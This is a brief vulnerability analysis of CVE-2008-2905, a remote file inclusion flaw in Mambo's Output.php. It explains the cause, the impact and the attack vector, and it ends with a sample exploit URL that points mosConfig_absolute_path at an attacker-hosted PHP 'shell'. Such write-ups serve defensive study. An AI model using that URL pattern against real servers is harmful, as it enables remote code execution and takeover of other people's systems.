Based on the provided information, here's an analysis of CVE-2008-2905:

**Root Cause of Vulnerability:**
The vulnerability is a Remote File Inclusion (RFI) flaw present in the `Output.php` file of Mambo versions 4.6.4 and earlier. The vulnerability arises because the `mosConfig_absolute_path` variable, which is used in a `require_once` statement to include another file, is not properly sanitized. This allows an attacker to control the path of the included file via a GET parameter, enabling remote file inclusion.

**Weaknesses/Vulnerabilities Present:**
- Remote File Inclusion (RFI): The application directly uses user-supplied input to determine the path of a file to be included, without proper validation or sanitization. This allows for remote code execution through inclusion of a malicious file.

**Impact of Exploitation:**
- Remote Code Execution: By including a file from a remote server controlled by the attacker, arbitrary PHP code can be executed on the vulnerable server. This allows the attacker to gain control of the server, potentially leading to data theft, system compromise, or further attacks.

**Attack Vectors:**
- HTTP GET Request: The attacker crafts a malicious URL with a `mosConfig_absolute_path` parameter that points to a remote server hosting a malicious PHP file. The vulnerable server, upon processing the request, will attempt to include the file specified by the attacker via `require_once`, leading to arbitrary code execution.

**Required Attacker Capabilities/Position:**
- Network access to the vulnerable server.
- Ability to host a malicious PHP file on a web server that the vulnerable server can access.

**Technical Details:**
- The vulnerability is located in `/includes/Cache/Lite/Output.php`, specifically on line 14: `require_once($mosConfig_absolute_path . '/includes/Cache/Lite.php');`
- The `mosConfig_absolute_path` is passed via a GET parameter in the URL.
- Example exploit URL: `http://[host]/[path]/includes/Cache/Lite/Output.php?mosConfig_absolute_path=http://shell?` where `http://shell?` is a malicious PHP file hosted on an attacker-controlled server.

This exploit allows the attacker to inject PHP code through a remote file inclusion vulnerability, giving them the potential for complete control over the compromised server.
